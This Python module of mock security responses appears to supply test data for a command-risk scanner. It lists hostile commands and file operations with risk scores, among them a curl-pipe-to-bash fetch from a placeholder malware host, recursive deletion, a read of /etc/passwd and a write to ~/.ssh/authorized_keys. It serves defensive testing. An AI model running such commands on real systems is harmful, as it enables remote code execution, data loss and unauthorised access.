"""
Security-specific mock responses.

Provides pre-built security data for various test scenarios.
"""

from typing import Any


def realistic_security() -> dict[str, Any]:
    """Create realistic security data with commands and risk levels."""
    return {
        "stats": {
            "total_scanned": 156,
            "total_commands": 89,
            "critical": 2,
            "high": 7,
            "medium": 15,
            "low": 65,
        },
        "commands": [
            {
                "command": "rm -rf /tmp/cache/*",
                "risk": "critical",
                "score": 95,
                "reason": "Recursive deletion with wildcard",
            },
            {
                "command": "curl https://malware.example.com/script.sh | bash",
                "risk": "critical",
                "score": 98,
                "reason": "Remote code execution",
            },
            {
                "command": "chmod 777 /var/www",
                "risk": "high",
                "score": 75,
                "reason": "Overly permissive permissions",
            },
            {
                "command": "git push --force origin main",
                "risk": "high",
                "score": 70,
                "reason": "Force push to main branch",
            },
            {
                "command": "pip install requests",
                "risk": "low",
                "score": 10,
                "reason": "Package installation",
            },
        ],
        "files": [
            {
                "operation": "READ",
                "path": "/etc/passwd",
                "risk": "high",
                "score": 80,
                "reason": "Sensitive system file",
            },
            {
                "operation": "WRITE",
                "path": "~/.ssh/authorized_keys",
                "risk": "critical",
                "score": 95,
                "reason": "SSH key modification",
            },
        ],
        "critical_items": [
            {
                "type": "COMMAND",
                "details": "rm -rf /tmp/cache/*",
                "risk": "critical",
                "reason": "Recursive deletion",
                "score": 95,
            },
            {
                "type": "COMMAND",
                "details": "curl ... | bash",
                "risk": "critical",
                "reason": "Remote code execution",
                "score": 98,
            },
        ],
    }
